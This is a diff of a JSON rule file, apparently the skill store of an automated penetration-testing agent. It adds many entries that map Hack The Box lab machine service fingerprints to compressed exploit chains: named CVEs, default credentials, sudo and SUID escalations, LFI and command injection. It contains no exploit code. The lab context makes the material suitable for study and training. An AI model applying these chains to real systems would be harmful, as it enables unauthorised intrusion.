@@ -1,7 +1,7 @@
 {
   "version": "1.0",
-  "last_updated": 1771203528.1206179,
-  "skill_count": 107,
+  "last_updated": 1771252925.159483,
+  "skill_count": 296,
   "skills": {
     "skill_001": {
       "id": "skill_001",
@@ -29,18 +29,20 @@
     },
     "skill_002": {
       "id": "skill_002",
-      "if_condition": "When HTTP 80/443 responds with Apache or nginx banner",
-      "then_action": "Launch directory brute force with gobuster and parse 200/403 paths",
+      "if_condition": "When SSH (port 22) is open and banner is captured",
+      "then_action": "Run ssh enumeration scripts to verify supported authentication methods and weak ciphers.",
       "parameters_template": {
-        "url": "http://target",
-        "wordlist": "/usr/share/wordlists/dirb/common.txt"
+        "port": 22,
+        "scripts": [
+          "ssh-hostkey",
+          "ssh-auth-methods"
+        ]
       },
-      "confidence": 0.78,
+      "confidence": 0.82,
       "evidence_refs": [
-        "ep001_step8",
-        "ep001_step9"
+        "run_20260216_025648_702693_ep001_step09"
       ],
-      "created_at": 1770492809.0169835,
+      "created_at": 1771207038.667601,
       "usage_count": 0,
       "success_rate": 0.0
     },
@@ -1568,6 +1570,2550 @@
         "ep001_step22"
       ],
       "created_at": 1771203528.1197052,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_lame_foothold": {
+      "id": "htb_lame_foothold",
+      "if_condition": "Target has services matching Lame pattern: 21/vsftpd 2.3.4, 22/OpenSSH 4.7p1, 139/Samba 3.0.20",
+      "then_action": "Samba 3.0.20 username map script RCE (CVE-2007-2447) \u2192 root shell directly",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_lame"
+      ],
+      "created_at": 1771203863.977879,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_blue_foothold": {
+      "id": "htb_blue_foothold",
+      "if_condition": "Target has services matching Blue pattern: 135/MSRPC, 139/NetBIOS, 445/SMB",
+      "then_action": "MS17-010 EternalBlue SMB RCE \u2192 SYSTEM shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_blue"
+      ],
+      "created_at": 1771203863.9893007,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_jerry_foothold": {
+      "id": "htb_jerry_foothold",
+      "if_condition": "Target has services matching Jerry pattern: 8080/Apache Tomcat 7.0.88",
+      "then_action": "Tomcat manager default creds (tomcat:s3cret) \u2192 WAR deploy \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_jerry"
+      ],
+      "created_at": 1771203863.9943352,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_nibbles_foothold": {
+      "id": "htb_nibbles_foothold",
+      "if_condition": "Target has services matching Nibbles pattern: 22/OpenSSH 7.2p2, 80/Apache 2.4.18",
+      "then_action": "Nibbleblog CMS file upload \u2192 PHP shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_nibbles"
+      ],
+      "created_at": 1771203863.9985652,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_nibbles_privesc": {
+      "id": "htb_nibbles_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Nibbles",
+      "then_action": "sudo /home/nibbler/personal/stuff/monitor.sh \u2014 writable script with sudo NOPASSWD",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_nibbles"
+      ],
+      "created_at": 1771203864.0031316,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_shocker_foothold": {
+      "id": "htb_shocker_foothold",
+      "if_condition": "Target has services matching Shocker pattern: 80/Apache 2.4.18, 2222/OpenSSH 7.2p2",
+      "then_action": "Shellshock (CVE-2014-6271) in /cgi-bin/user.sh",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_shocker"
+      ],
+      "created_at": 1771203864.0077214,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_shocker_privesc": {
+      "id": "htb_shocker_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Shocker",
+      "then_action": "sudo perl \u2014 perl has sudo NOPASSWD",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_shocker"
+      ],
+      "created_at": 1771203864.0126283,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_beep_foothold": {
+      "id": "htb_beep_foothold",
+      "if_condition": "Target has services matching Beep pattern: 22/OpenSSH 4.3, 25/Postfix, 80/Apache 2.2.3",
+      "then_action": "Elastix LFI \u2192 credentials \u2192 SSH as root OR Webmin shellshock OR FreePBX upload",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_beep"
+      ],
+      "created_at": 1771203864.01738,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_optimum_foothold": {
+      "id": "htb_optimum_foothold",
+      "if_condition": "Target has services matching Optimum pattern: 80/HttpFileServer 2.3",
+      "then_action": "HFS 2.3 RCE (CVE-2014-6287) \u2192 user shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_optimum"
+      ],
+      "created_at": 1771203864.022113,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_optimum_privesc": {
+      "id": "htb_optimum_privesc",
+      "if_condition": "Have user shell on windows system similar to HTB Optimum",
+      "then_action": "MS16-032 kernel exploit (Secondary Logon Handle) \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_optimum"
+      ],
+      "created_at": 1771203864.0265138,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_grandpa_foothold": {
+      "id": "htb_grandpa_foothold",
+      "if_condition": "Target has services matching Grandpa pattern: 80/IIS 6.0",
+      "then_action": "IIS 6.0 WebDAV buffer overflow (CVE-2017-7269) \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_grandpa"
+      ],
+      "created_at": 1771203864.0307481,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_grandpa_privesc": {
+      "id": "htb_grandpa_privesc",
+      "if_condition": "Have user shell on windows system similar to HTB Grandpa",
+      "then_action": "Token impersonation (churrasco/JuicyPotato) \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_grandpa"
+      ],
+      "created_at": 1771203864.036168,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_legacy_foothold": {
+      "id": "htb_legacy_foothold",
+      "if_condition": "Target has services matching Legacy pattern: 135/MSRPC, 139/NetBIOS, 445/SMB",
+      "then_action": "MS08-067 NetAPI RCE \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_legacy"
+      ],
+      "created_at": 1771203864.0415444,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_arctic_foothold": {
+      "id": "htb_arctic_foothold",
+      "if_condition": "Target has services matching Arctic pattern: 135/MSRPC, 8500/Adobe ColdFusion 8",
+      "then_action": "ColdFusion 8 directory traversal \u2192 admin hash \u2192 scheduled task upload \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_arctic"
+      ],
+      "created_at": 1771203864.0458484,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_arctic_privesc": {
+      "id": "htb_arctic_privesc",
+      "if_condition": "Have user shell on windows system similar to HTB Arctic",
+      "then_action": "MS10-059 Chimichurri \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_arctic"
+      ],
+      "created_at": 1771203864.0506394,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_bank_foothold": {
+      "id": "htb_bank_foothold",
+      "if_condition": "Target has services matching Bank pattern: 22/OpenSSH 6.6.1p1, 53/ISC BIND 9.9.5, 80/Apache 2.4.7",
+      "then_action": "DNS zone transfer \u2192 bank.htb \u2192 web app \u2192 file upload bypass (.htb extension) \u2192 PHP shell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_bank"
+      ],
+      "created_at": 1771203864.0563915,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_bank_privesc": {
+      "id": "htb_bank_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Bank",
+      "then_action": "SUID /var/htb/bin/emergency \u2192 root shell",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_bank"
+      ],
+      "created_at": 1771203864.0618114,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_poison_foothold": {
+      "id": "htb_poison_foothold",
+      "if_condition": "Target has services matching Poison pattern: 22/OpenSSH 7.2, 80/Apache 2.4.29",
+      "then_action": "LFI in PHP include \u2192 /etc/passwd \u2192 base64 encoded password file \u2192 SSH",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_poison"
+      ],
+      "created_at": 1771203864.066647,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_poison_privesc": {
+      "id": "htb_poison_privesc",
+      "if_condition": "Have user shell on freebsd system similar to HTB Poison",
+      "then_action": "VNC running as root on localhost \u2192 SSH tunnel \u2192 VNC connect \u2192 root desktop",
+      "parameters_template": {},
+      "confidence": 0.82,
+      "evidence_refs": [
+        "htb_poison"
+      ],
+      "created_at": 1771203864.0714934,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_nineveh_foothold": {
+      "id": "htb_nineveh_foothold",
+      "if_condition": "Target has services matching Nineveh pattern: 80/Apache 2.4.18, 443/Apache 2.4.18 HTTPS",
+      "then_action": "phpLiteAdmin default creds \u2192 create PHP shell DB \u2192 LFI to trigger \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_nineveh"
+      ],
+      "created_at": 1771203864.0765333,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_nineveh_privesc": {
+      "id": "htb_nineveh_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Nineveh",
+      "then_action": "Chkrootkit 0.49 local root exploit (cron runs chkrootkit as root)",
+      "parameters_template": {},
+      "confidence": 0.82,
+      "evidence_refs": [
+        "htb_nineveh"
+      ],
+      "created_at": 1771203864.0798898,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_blocky_foothold": {
+      "id": "htb_blocky_foothold",
+      "if_condition": "Target has services matching Blocky pattern: 22/OpenSSH 7.2p2, 80/Apache 2.4.18, 25565/Minecraft",
+      "then_action": "WordPress \u2192 /plugins/ \u2192 decompile JAR \u2192 hardcoded MySQL creds \u2192 SSH password reuse",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_blocky"
+      ],
+      "created_at": 1771203864.083576,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_blocky_privesc": {
+      "id": "htb_blocky_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Blocky",
+      "then_action": "sudo -l \u2192 (ALL) ALL \u2192 sudo su",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_blocky"
+      ],
+      "created_at": 1771203864.087796,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_sense_foothold": {
+      "id": "htb_sense_foothold",
+      "if_condition": "Target has services matching Sense pattern: 80/lighttpd 1.4.35, 443/lighttpd 1.4.35",
+      "then_action": "pfSense \u2192 command injection in graph status (CVE-2014-4688) \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_sense"
+      ],
+      "created_at": 1771203864.0915027,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_irked_foothold": {
+      "id": "htb_irked_foothold",
+      "if_condition": "Target has services matching Irked pattern: 22/OpenSSH 6.7p1, 80/Apache 2.4.10, 6697/UnrealIRCd",
+      "then_action": "UnrealIRCd 3.2.8.1 backdoor \u2192 shell as ircd user",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_irked"
+      ],
+      "created_at": 1771203864.0946412,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_irked_privesc": {
+      "id": "htb_irked_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Irked",
+      "then_action": "Steganography in /home/djmardov/.backup \u2192 base64 password \u2192 viewuser SUID \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_irked"
+      ],
+      "created_at": 1771203864.0985274,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_friendzone_foothold": {
+      "id": "htb_friendzone_foothold",
+      "if_condition": "Target has services matching FriendZone pattern: 21/vsftpd 3.0.3, 22/OpenSSH 7.6p1, 53/ISC BIND 9.11",
+      "then_action": "DNS zone transfer \u2192 SMB writable share \u2192 upload PHP shell \u2192 LFI trigger",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_friendzone"
+      ],
+      "created_at": 1771203864.1021385,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_friendzone_privesc": {
+      "id": "htb_friendzone_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB FriendZone",
+      "then_action": "Python library hijacking (os.py writable) \u2192 cron runs python script as root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_friendzone"
+      ],
+      "created_at": 1771203864.1063156,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_buff_foothold": {
+      "id": "htb_buff_foothold",
+      "if_condition": "Target has services matching Buff pattern: 8080/Apache 2.4.43 / Gym Management System 1.0",
+      "then_action": "Gym Management System 1.0 unauthenticated RCE \u2192 webshell",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_buff"
+      ],
+      "created_at": 1771203864.1130548,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_buff_privesc": {
+      "id": "htb_buff_privesc",
+      "if_condition": "Have user shell on windows system similar to HTB Buff",
+      "then_action": "CloudMe 1.11.2 buffer overflow (localhost:8888) \u2192 chisel tunnel \u2192 exploit \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_buff"
+      ],
+      "created_at": 1771203864.1174448,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_delivery_foothold": {
+      "id": "htb_delivery_foothold",
+      "if_condition": "Target has services matching Delivery pattern: 22/OpenSSH 7.9p1, 80/nginx 1.14.2, 8065/Mattermost",
+      "then_action": "OSTicket \u2192 get @delivery.htb email \u2192 verify Mattermost account \u2192 internal chat creds",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_delivery"
+      ],
+      "created_at": 1771203864.1223195,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_delivery_privesc": {
+      "id": "htb_delivery_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Delivery",
+      "then_action": "MySQL \u2192 hash from Mattermost DB \u2192 hashcat rules (best64) on 'PleaseSubscribe!' \u2192 root SSH",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_delivery"
+      ],
+      "created_at": 1771203864.1281753,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_knife_foothold": {
+      "id": "htb_knife_foothold",
+      "if_condition": "Target has services matching Knife pattern: 22/OpenSSH 8.2p1, 80/Apache 2.4.41",
+      "then_action": "PHP/8.1.0-dev backdoor \u2192 User-Agentt header RCE",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_knife"
+      ],
+      "created_at": 1771203864.133836,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_knife_privesc": {
+      "id": "htb_knife_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Knife",
+      "then_action": "sudo knife exec \u2192 Ruby code execution as root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_knife"
+      ],
+      "created_at": 1771203864.1394353,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_previse_foothold": {
+      "id": "htb_previse_foothold",
+      "if_condition": "Target has services matching Previse pattern: 22/OpenSSH 7.6p1, 80/Apache 2.4.29",
+      "then_action": "Insecure redirect (302 with body) \u2192 register account \u2192 OS command injection in logs",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_previse"
+      ],
+      "created_at": 1771203864.1449523,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_previse_privesc": {
+      "id": "htb_previse_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Previse",
+      "then_action": "PATH injection in script run via sudo \u2192 /opt/scripts/log_process.sh uses gzip without full path",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_previse"
+      ],
+      "created_at": 1771203864.1505177,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_photobomb_foothold": {
+      "id": "htb_photobomb_foothold",
+      "if_condition": "Target has services matching Photobomb pattern: 22/OpenSSH 8.2p1, 80/nginx 1.18.0",
+      "then_action": "Creds in JS file \u2192 blind command injection in image download (filetype parameter)",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "htb_photobomb"
+      ],
+      "created_at": 1771203864.1595235,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_photobomb_privesc": {
+      "id": "htb_photobomb_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Photobomb",
+      "then_action": "sudo /opt/cleanup.sh \u2192 PATH injection + LD_PRELOAD \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "htb_photobomb"
+      ],
+      "created_at": 1771203864.168331,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_forge_foothold": {
+      "id": "htb_forge_foothold",
+      "if_condition": "Target has services matching Forge pattern: 22/OpenSSH 8.2p1, 80/Apache 2.4.41",
+      "then_action": "SSRF via image upload URL \u2192 access internal admin panel \u2192 read SSH key",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_forge"
+      ],
+      "created_at": 1771203864.1733243,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_forge_privesc": {
+      "id": "htb_forge_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Forge",
+      "then_action": "Python script with sudo + PDB debugger escape \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.82,
+      "evidence_refs": [
+        "htb_forge"
+      ],
+      "created_at": 1771203864.1796076,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_unicode_foothold": {
+      "id": "htb_unicode_foothold",
+      "if_condition": "Target has services matching Unicode pattern: 22/OpenSSH 8.2p1, 80/nginx 1.18.0",
+      "then_action": "JWT secret in jwks.json \u2192 forge admin JWT \u2192 unicode normalization LFI bypass \u2192 credentials",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_unicode"
+      ],
+      "created_at": 1771203864.1853225,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_unicode_privesc": {
+      "id": "htb_unicode_privesc",
+      "if_condition": "Have user shell on linux system similar to HTB Unicode",
+      "then_action": "sudo treport \u2192 curl injection via URL parameter \u2192 read root flag",
+      "parameters_template": {},
+      "confidence": 0.82,
+      "evidence_refs": [
+        "htb_unicode"
+      ],
+      "created_at": 1771203864.1910968,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_awkward_foothold": {
+      "id": "htb_awkward_foothold",
+      "if_condition": "Target has services matching Awkward pattern: 22/OpenSSH 8.9p1, 80/nginx 1.18.0",
+      "then_action": "JWT secret leak \u2192 SSRF via API \u2192 internal service \u2192 command injection in mail",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_awkward"
+      ],
+      "created_at": 1771203864.197005,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_granny_foothold": {
+      "id": "htb_granny_foothold",
+      "if_condition": "Target matches HTB Granny (windows/easy) pattern",
+      "then_action": "IIS 6.0 WebDAV PUT upload \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_granny"
+      ],
+      "created_at": 1771203864.2017689,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_granny_privesc": {
+      "id": "htb_granny_privesc",
+      "if_condition": "User shell on windows matching HTB Granny",
+      "then_action": "Token impersonation \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_granny"
+      ],
+      "created_at": 1771203864.205541,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_bastard_foothold": {
+      "id": "htb_bastard_foothold",
+      "if_condition": "Target matches HTB Bastard (windows/medium) pattern",
+      "then_action": "Drupal 7 CVE-2018-7600 Drupalgeddon2 \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_bastard"
+      ],
+      "created_at": 1771203864.2097864,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_bastard_privesc": {
+      "id": "htb_bastard_privesc",
+      "if_condition": "User shell on windows matching HTB Bastard",
+      "then_action": "MS15-051 kernel exploit \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_bastard"
+      ],
+      "created_at": 1771203864.2144735,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_bounty_foothold": {
+      "id": "htb_bounty_foothold",
+      "if_condition": "Target matches HTB Bounty (windows/easy) pattern",
+      "then_action": "IIS upload .config file \u2192 RCE",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_bounty"
+      ],
+      "created_at": 1771203864.2191103,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_bounty_privesc": {
+      "id": "htb_bounty_privesc",
+      "if_condition": "User shell on windows matching HTB Bounty",
+      "then_action": "MS10-092 Task Scheduler \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_bounty"
+      ],
+      "created_at": 1771203864.2243302,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_cronos_foothold": {
+      "id": "htb_cronos_foothold",
+      "if_condition": "Target matches HTB Cronos (linux/medium) pattern",
+      "then_action": "DNS zone transfer \u2192 admin.cronos.htb \u2192 SQLi login bypass \u2192 command injection",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_cronos"
+      ],
+      "created_at": 1771203864.2290668,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_cronos_privesc": {
+      "id": "htb_cronos_privesc",
+      "if_condition": "User shell on linux matching HTB Cronos",
+      "then_action": "Laravel cron \u2192 writable schedule \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_cronos"
+      ],
+      "created_at": 1771203864.233657,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_valentine_foothold": {
+      "id": "htb_valentine_foothold",
+      "if_condition": "Target matches HTB Valentine (linux/easy) pattern",
+      "then_action": "Heartbleed (CVE-2014-0160) \u2192 base64 SSH key passphrase",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_valentine"
+      ],
+      "created_at": 1771203864.2383516,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_valentine_privesc": {
+      "id": "htb_valentine_privesc",
+      "if_condition": "User shell on linux matching HTB Valentine",
+      "then_action": "tmux session running as root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_valentine"
+      ],
+      "created_at": 1771203864.243026,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_popcorn_foothold": {
+      "id": "htb_popcorn_foothold",
+      "if_condition": "Target matches HTB Popcorn (linux/medium) pattern",
+      "then_action": "Torrent Hoster file upload \u2192 PHP shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_popcorn"
+      ],
+      "created_at": 1771203864.2477205,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_popcorn_privesc": {
+      "id": "htb_popcorn_privesc",
+      "if_condition": "User shell on linux matching HTB Popcorn",
+      "then_action": "DirtyCow (CVE-2016-5195) or PAM motd privesc",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_popcorn"
+      ],
+      "created_at": 1771203864.2524276,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_solidstate_foothold": {
+      "id": "htb_solidstate_foothold",
+      "if_condition": "Target matches HTB SolidState (linux/medium) pattern",
+      "then_action": "Apache James 2.3.2 default creds \u2192 modify user email \u2192 read restricted mail",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_solidstate"
+      ],
+      "created_at": 1771203864.2574332,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_solidstate_privesc": {
+      "id": "htb_solidstate_privesc",
+      "if_condition": "User shell on linux matching HTB SolidState",
+      "then_action": "Cron writable /opt/tmp.py \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_solidstate"
+      ],
+      "created_at": 1771203864.2637868,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_secnotes_foothold": {
+      "id": "htb_secnotes_foothold",
+      "if_condition": "Target matches HTB SecNotes (windows/medium) pattern",
+      "then_action": "CSRF \u2192 change admin password \u2192 SMB creds in notes \u2192 WSL bash.exe",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_secnotes"
+      ],
+      "created_at": 1771203864.2702897,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_secnotes_privesc": {
+      "id": "htb_secnotes_privesc",
+      "if_condition": "User shell on windows matching HTB SecNotes",
+      "then_action": "WSL root \u2192 access Windows filesystem",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_secnotes"
+      ],
+      "created_at": 1771203864.2749836,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_openadmin_foothold": {
+      "id": "htb_openadmin_foothold",
+      "if_condition": "Target matches HTB OpenAdmin (linux/easy) pattern",
+      "then_action": "OpenNetAdmin 18.1.1 RCE \u2192 user \u2192 internal Apache \u2192 nano sudo",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_openadmin"
+      ],
+      "created_at": 1771203864.27937,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_openadmin_privesc": {
+      "id": "htb_openadmin_privesc",
+      "if_condition": "User shell on linux matching HTB OpenAdmin",
+      "then_action": "sudo nano \u2192 GTFOBins \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_openadmin"
+      ],
+      "created_at": 1771203864.285695,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_traverxec_foothold": {
+      "id": "htb_traverxec_foothold",
+      "if_condition": "Target matches HTB Traverxec (linux/easy) pattern",
+      "then_action": "Nostromo 1.9.6 RCE (CVE-2019-16278) \u2192 user shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_traverxec"
+      ],
+      "created_at": 1771203864.2927744,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_traverxec_privesc": {
+      "id": "htb_traverxec_privesc",
+      "if_condition": "User shell on linux matching HTB Traverxec",
+      "then_action": "journalctl via sudo \u2192 less pager \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_traverxec"
+      ],
+      "created_at": 1771203864.29943,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_magic_foothold": {
+      "id": "htb_magic_foothold",
+      "if_condition": "Target matches HTB Magic (linux/medium) pattern",
+      "then_action": "Image upload PHP polyglot \u2192 webshell \u2192 MySQL creds",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_magic"
+      ],
+      "created_at": 1771203864.3093276,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_magic_privesc": {
+      "id": "htb_magic_privesc",
+      "if_condition": "User shell on linux matching HTB Magic",
+      "then_action": "SUID sysinfo \u2192 PATH injection \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_magic"
+      ],
+      "created_at": 1771203864.3173695,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_tabby_foothold": {
+      "id": "htb_tabby_foothold",
+      "if_condition": "Target matches HTB Tabby (linux/easy) pattern",
+      "then_action": "Tomcat LFI \u2192 manager creds \u2192 WAR deploy \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_tabby"
+      ],
+      "created_at": 1771203864.3353484,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_tabby_privesc": {
+      "id": "htb_tabby_privesc",
+      "if_condition": "User shell on linux matching HTB Tabby",
+      "then_action": "lxd group \u2192 container escape \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_tabby"
+      ],
+      "created_at": 1771203864.3444107,
+      "usage_count": 0,
